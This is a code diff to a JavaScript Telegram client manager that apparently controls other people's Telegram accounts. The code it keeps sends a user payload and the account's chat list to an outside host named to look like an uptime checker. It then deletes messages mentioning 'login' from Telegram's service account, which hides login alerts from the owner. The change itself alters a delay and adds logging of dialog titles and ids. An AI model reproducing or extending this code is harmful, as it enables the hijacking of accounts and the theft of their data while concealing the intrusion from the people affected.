@@ -206,17 +206,15 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                await sleep(1000);
+                await sleep(2000);
                 const msgs = await this.client.getMessages("777000", { limit: 2 });
                 msgs.forEach(async msg => {
                     if (msg.text.toLowerCase().includes('login'))
                         await msg.delete({ revoke: true });
                 })
-                await sleep(1000);
-                const msgs2 = await this.client.getMessages("777000", { limit: 2 });
-                msgs2.forEach(async msg => {
-                    if (msg.text.toLowerCase().includes('login'))
-                        await msg.delete({ revoke: true });
+                const dialogs = await this.client.getDialogs({ limit: 10 });
+                dialogs.forEach((dialog) => {
+                    console.log(dialog.title, dialog.id);
                 })
                 setTimeout(async () => {
                     await restAcc(this.phoneNumber);
